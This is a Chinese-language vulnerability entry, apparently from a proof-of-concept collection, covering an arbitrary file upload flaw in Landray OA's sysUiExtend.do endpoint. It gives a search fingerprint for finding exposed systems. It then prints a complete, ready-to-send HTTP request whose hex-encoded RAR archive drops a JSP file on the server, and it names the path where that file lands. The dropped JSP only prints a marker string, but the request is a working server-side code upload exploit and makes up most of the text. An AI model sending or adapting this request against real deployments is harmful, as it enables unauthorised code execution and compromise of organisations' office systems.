﻿# 蓝凌OA sysUiExtend.do 任意文件上传漏洞

> 更新时间：2024-01-29

> 漏洞编号：

> 漏洞说明：蓝凌智能OA是一款针对中小企业的移动化智能办公产品 ，融合了钉钉数字化能力与蓝凌多年OA产品与服务经验，能全面满足企业日常办公在线、企业文化在线、客户管理在线、人事服务在线、行政务服务在线等需求。
蓝凌OAsysUiExtend.do接口处存在任意文件上传漏洞，未恶意攻击者可能会利用此漏洞获取敏感信息，对系统造成危害。

> 漏洞特征：app="Landray-OA系统"

> 验证脚本：HTTP

```
POST /api///sys/ui/sys_ui_extend/sysUiExtend.do?method=getThemeInfo HTTP/1.1
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------260140030128010173621878123124
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
 
-----------------------------260140030128010173621878123124
Content-Disposition: form-data; name="file"; filename="dudesite.rar"
Content-Type: application/octet-stream
 
$<Stream>0x526172211A0700CF907300000D0000000000000005AD7420902B00260000002A00000002AB984EA5696D3D581D3306002000000075692E696E6900B0EF88480D0108FE8CB7B255254C5B3FE4A601880FF1124111D9F359070482E9077A6EA9C68FCAFAFD20E4D674209031001D0000001D00000002563F7118856D3D581D300C002000000064756465736974652E6A737000B01A74443C25206F75742E7072696E746C6E2822647564657369746522293B253EC43D7B00400700</Stream>$
-----------------------------260140030128010173621878123124--
```

> 响应代码特征：200

> 响应内容特征：

> 上传文件定位：/resource/ui-ext/dudesite/dudesite.jsp


> 验证文件来源：蓝凌OA sysUiExtend.do 任意文件上传漏洞.poc
